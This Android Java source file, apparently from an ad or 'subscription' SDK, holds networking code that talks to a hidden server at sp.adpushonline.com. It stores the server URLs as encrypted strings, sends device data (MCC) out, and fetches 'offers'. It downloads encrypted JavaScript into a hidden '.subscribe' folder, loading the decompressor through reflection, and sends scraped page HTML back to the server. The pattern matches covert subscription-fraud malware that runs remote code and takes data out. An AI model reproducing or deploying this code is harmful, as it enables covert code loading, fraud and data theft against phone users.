package oom.tblib.sub.http;

import android.content.Context;
import android.os.Environment;
import android.text.TextUtils;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPOutputStream;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import oom.tblib.sub.utils.AESUtils;
import oom.tblib.sub.utils.Uca;
import oom.tblib.sub.utils.Uh;
import oom.tblib.sub.utils.Ujs;
import oom.tblib.sub.utils.Ulog;

/**
 * Created by xlc on 2017/5/24.
 */

public class H_okhttp {


    public static final String js_get_source = "javascript:window.myObj.getSource(document.getElementsByTagName('html')[0].innerHTML);";

    //    public static final String A = "aHR0cDovL3NwLmFkcHVzaG9ubGluZS5jb206NzA4OC9zZGtfcC9h";//ENCODE_OFFER_URL
    //    public static final String B = "aHR0cDovL3NwLmFkcHVzaG9ubGluZS5jb206NzA4OC9zZGtfcC9i";//CONNECT_URL
    //    public static final String C = "aHR0cDovL3NwLmFkcHVzaG9ubGluZS5jb206NzA4OC9zZGtfcC9j";//RESOURCE_URL
    //    public static final String D = "aHR0cDovL3NwLmFkcHVzaG9ubGluZS5jb206NzA4OC9zZGtfcC9k";//ENCODE_JS_URL

    //ENCODE_OFFER_URL  http://sp.adpushonline.com:7088/sdk_p/a
    public static final String A = "7E80BDF1A8749BB07A1D031E09552A7A8A5898C6CA02CC022D559917239CCC4C797934604A4E1369E337024961486EBF";
    //CONNECT_URL   http://sp.adpushonline.com:7088/sdk_p/b
    public static final String URL_B = "7E80BDF1A8749BB07A1D031E09552A7A8A5898C6CA02CC022D559917239CCC4CCFA089800E6B7AB1F64971F8E1D217AE";
    //RESOURCE_URL  http://sp.adpushonline.com:7088/sdk_p/c
    public static final String C = "7E80BDF1A8749BB07A1D031E09552A7A8A5898C6CA02CC022D559917239CCC4C96580EE1982A96E5E33198118B01B312";
    //http://sp.adpushonline.com:7088/sdk_p/d
    public static final String D = "7E80BDF1A8749BB07A1D031E09552A7A8A5898C6CA02CC022D559917239CCC4CF30F236CBABC15067AE367EFBDB9950B";

    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    public static ExecutorService executorService = Executors.newScheduledThreadPool(20);

    /**
     * POST 请求
     *
     * @return
     */
    public static String post(String url, RequestBody requestBody) {

        OkHttpClient okHttpClient = new OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build();
        Request request = new Request.Builder().url(url).post(requestBody).build();
        Response response;
        try {
            response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return response.body().string();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * get请求
     *
     * @param url
     * @return
     */
    public static String get(String url) {
        OkHttpClient okHttpClient = new OkHttpClient();
        Request request = new Request.Builder().url(url).build();
        Response response;
        try {
            response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return response.body().string();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 联网
     *
     * @param objectMap
     * @param context
     */
    public static synchronized void connect(Map<String, Object> objectMap, Context context) {

        JSONObject jsonObject = new JSONObject(objectMap);

        String jsonString = jsonObject.toString();

        String encodeString = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

        if (!TextUtils.isEmpty(encodeString)) {

            OkHttpClient okHttpClient = new OkHttpClient.Builder().readTimeout(15, TimeUnit.SECONDS).build();
            RequestBody body = RequestBody.create(JSON, encodeString);

            Request request = new Request.Builder().url(AESUtils.decode(URL_B)).post(body).build();
            try {

                Response response = okHttpClient.newCall(request).execute();

                //                Ulog.w("联网状态: " + response.code());

                try {
                    if (response.isSuccessful()) {

                                                Ulog.show("con success");
                        //                        Ulog.w("联网: 成功！");
                    }
                } finally {
                    response.body().close();
                }
            } catch (IOException e) {

                //                Ulog.w("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            }
        }
    }

    /**
     * 下载
     *
     * @param context
     * @return
     */
    public static boolean post_download_js(Context context) {

        boolean downlod_status = false;

        Map<String, Object> map = new HashMap<>();

        map.put("mcc", Uca.getMcc(context));

        JSONObject jsonObject = new JSONObject(map);

        String jsonString = jsonObject.toString();

        String encode = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

        File file_name = null;

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, ".subscribe");

        if (!file.exists()) {

            file.mkdirs();
        }
        file_name = new File(file.getPath(), "encode.js");

        //                Ulog.w("post_test: encode" + encode);

        InputStream input = null;

        //  GZIPInputStream inputStream = null;
        Object inputStream = null;

        FileOutputStream fileOutputStream = null;

        Response response = null;

        if (!TextUtils.isEmpty(encode)) {

            OkHttpClient okHttpClient = new OkHttpClient.Builder().writeTimeout(20, TimeUnit.SECONDS).build();
            RequestBody body = RequestBody.create(JSON, encode);

            //            String url = new String(Base64.decode(D.getBytes(), Base64.DEFAULT));
            String url = AESUtils.decode(D);
            Request request = new Request.Builder().url(url).post(body).header("Content-Encoding", "gzip").build();

            try {

                response = okHttpClient.newCall(request).execute();

                //                  Ulog.w("post_test: " + response.code());

                if (response.isSuccessful()) {

                    input = response.body().byteStream();

                    Class cls = Class.forName("java.util.zip.GZIPInputStream");
                    Constructor<?> con = cls.getConstructor(new Class[]{InputStream.class});
                    inputStream = con.newInstance(new Object[]{input});

                    //                    inputStream = new GZIPInputStream(input);

                    if (!file_name.exists()) {
                        file_name.createNewFile();
                    }

                    fileOutputStream = new FileOutputStream(file_name);
                    byte[] buffer = new byte[1024];
                    int n;

                    Method method = inputStream.getClass().getMethod("read", new Class[]{byte[].class});

                    //                    while ((n = inputStream.read(buffer)) >= 0) {
                    while ((n = (int) method.invoke(inputStream, new Object[]{buffer})) >= 0) {
                        fileOutputStream.write(buffer, 0, n);
                    }

                    Ulog.show("j success");
                }

                Ujs.getInstance(context).save_download_js_time();

                downlod_status = true;

            } catch (Exception e) {

                downlod_status = false;

                e.printStackTrace();

                if (file_name.exists()) {
                    file_name.delete();
                }
            } finally {
                //                                Ulog.w("do finally");

                if (response != null) {
                    response.body().close();
                }

                if (input != null) {
                    try {
                        input.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                if (fileOutputStream != null) {
                    try {
                        fileOutputStream.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (inputStream != null) {
                    try {
                        Method method = inputStream.getClass().getMethod("close");
                        method.invoke(inputStream);
                        //    inputStream.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        return downlod_status;
    }

    //.subscribe/encode.js
    private static final String jsName = "BIDC6kDAb5b8i01OGMoL9Kt9y50TrgRoU+By/rgz+RU=";

    /**
     * 直接读取加密的JS文件
     */
    public static String get_encode_js(Context context) {

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, H_encode.decrypt(jsName, AESUtils.keyBytes));

        if (!file.exists()) {
            return null;
        }

        FileInputStream fileInputStream = null;

        ByteArrayOutputStream out = null;

        try {

            fileInputStream = new FileInputStream(file);

            out = new ByteArrayOutputStream();

            byte[] buffer = new byte[1024];
            int n;
            while ((n = fileInputStream.read(buffer)) >= 0) {

                out.write(buffer, 0, n);

            }
            //解密
            String decode_js_source = H_encode.decrypt(out.toString(), Ujs.getInstance(context).getJs_key());

            //读取解密后的JS
            //                        Ulog.w("post_read_encode_js: 解密后的JS为：" + decode_js_source);

            return decode_js_source;

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (fileInputStream != null) {
                    fileInputStream.close();
                }
                if (out != null) {
                    out.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return null;
    }


    /**
     * 获取Offer
     */
    public static String getCaseData(Context context, Map<String, Object> objectMap) {

        //        Ulog.w("获取的参数：" + objectMap.toString());

        JSONObject jsonObject = new JSONObject(objectMap);

        String jsonString = jsonObject.toString();

        String offer_decode = null;

        //JNIUtils.getPublicKey(context)

        //        Ulog.w("加密文件：" + Ujs.getInstance(context).getJs_key());

        String encode = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

        //        Ulog.show("post_test: encode:" + encode);

        if (!TextUtils.isEmpty(encode)) {

            OkHttpClient okHttpClient = new OkHttpClient.Builder().readTimeout(15, TimeUnit.SECONDS).build();
            RequestBody body = RequestBody.create(JSON, encode);

            //            String url = new String(Base64.decode(A.getBytes(), Base64.DEFAULT));
            String url = AESUtils.decode(A);

            Request request = new Request.Builder().url(url).post(body).build();

            try {

                Response response = okHttpClient.newCall(request).execute();

                //                Ulog.w("加载offer状态: " + response.code());

                try {
                    if (response.isSuccessful()) {
                        //                        Ulog.w("postSource: 成功！");
                        String offer_encode = response.body().string();
                        //                        Ulog.w("加密前:" + offer_encode);
                        offer_decode = H_encode.decrypt(offer_encode, Ujs.getInstance(context).getJs_key());
                        //                        Ulog.w("解密后:" + offer_decode);
                    }
                } finally {
                    response.body().close();
                }
            } catch (IOException e) {
                //                Ulog.w("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            }
        }
        return offer_decode;
    }

    /**
     * 用okhttp 回传源码信息
     *
     * @param message
     */
    public static void postSource(Map<String, Object> message, Context context) {

        String offer_id = message.get("offer_id").toString();

        JSONObject jsonObject = new JSONObject(message);

        String jsonString = jsonObject.toString();

        //                Ulog.w("postSource:源码总长 " + jsonString.length());

        ByteArrayOutputStream arr = null;

        OutputStream zipper = null;

        //加密
        try {

            String encode = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

            if (!TextUtils.isEmpty(encode)) {

                byte[] data = encode.getBytes("UTF-8");

                arr = new ByteArrayOutputStream();

                zipper = new GZIPOutputStream(arr);

                zipper.write(data);

                zipper.close();

                OkHttpClient okHttpClient = new OkHttpClient.Builder().writeTimeout(50, TimeUnit.SECONDS).build();

                RequestBody body = RequestBody.create(JSON, arr.toByteArray());

                //                String url = new String(Base64.decode(C.getBytes(), Base64.DEFAULT));
                String url = AESUtils.decode(C);

                Request request = new Request.Builder().url(url).post(body).build();

                Response response = okHttpClient.newCall(request).execute();

                //                                Ulog.show("postSource status:" + response.code());
                try {
                    if (response.isSuccessful()) {
                        //                                                Ulog.show("postSource: success");
                        Uh.save(context, offer_id, 1);
                    } else {
                        //                                                Ulog.show("postSource: fail");
                    }
                } finally {
                    response.body().close();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
            //                        Ulog.show("postSource: fail:" + e.getMessage());
        } finally {
            try {
                if (arr != null) {
                    arr.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}